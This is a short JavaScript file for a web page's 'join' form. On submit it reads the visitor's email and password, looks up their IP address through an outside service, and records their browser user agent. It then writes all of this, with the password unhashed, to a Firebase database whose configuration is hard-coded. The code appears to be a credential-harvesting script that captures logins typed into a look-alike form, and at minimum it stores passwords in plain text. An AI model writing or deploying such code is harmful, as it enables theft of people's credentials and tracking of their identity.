import { initializeApp } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-app.js";
import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/12.3.0/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyDm1DG0FOe4jez8rWIUMIo6iJvrQRaaBIw",
  authDomain: "arafat-6f3ca.firebaseapp.com",
  databaseURL: "https://arafat-6f3ca-default-rtdb.firebaseio.com",
  projectId: "arafat-6f3ca",
  storageBucket: "arafat-6f3ca.firebasestorage.app",
  messagingSenderId: "460905067446",
  appId: "1:460905067446:web:f47df01ca0d9bf8f038717",
  measurementId: "G-G5X564KQCX"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function getUserIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch(e) {
    return "Unknown";
  }
}

document.getElementById("joinForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getUserIP();
  const userAgent = navigator.userAgent;

  const newRef = push(ref(db, "joinRequests"));
  set(newRef, {
    email,
    password,
    ip,
    userAgent,
    addedTime: Date.now()
  })
  .then(() => {
    alert("✅ Request submitted!");
    e.target.reset();
  })
  .catch(err => alert("⚠️ " + err.message));
});
